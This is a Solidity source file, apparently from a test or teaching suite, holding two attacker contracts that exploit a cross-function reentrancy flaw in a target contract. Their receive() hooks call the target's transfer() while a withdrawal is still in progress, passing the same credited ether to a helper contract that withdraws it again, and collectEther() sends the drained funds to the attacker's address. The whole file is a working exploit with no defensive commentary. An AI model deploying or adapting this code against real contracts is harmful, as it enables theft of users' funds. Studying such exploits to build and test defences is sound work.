// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../interfaces/cross-function/ICrossCall.sol';

contract CrossCallAttacker {
    ICrossCall public c;
    address public owner;
    CrossCallAttackerAux public aux;

    constructor(address _c) {
        c = ICrossCall(_c);
        owner = msg.sender;
        aux = new CrossCallAttackerAux(_c, msg.sender);
    }

    function attackStep1() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.withdraw();
    }

    function attackStep2() external {
        aux.attack();
        aux.collectEther();
    }

    function attackStep3() external {
        c.withdraw();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.transfer(address(aux), 1 ether);
        }
    }
}

contract CrossCallAttackerAux {
    ICrossCall public c;
    address public owner;
    address public ownerEOA;

    constructor(address _c, address _ownerEOA) {
        c = ICrossCall(_c);
        owner = msg.sender;
        ownerEOA = _ownerEOA;
    }

    function attack() external {
        c.withdraw();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(ownerEOA).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.transfer(owner, 1 ether);
        }
    }
}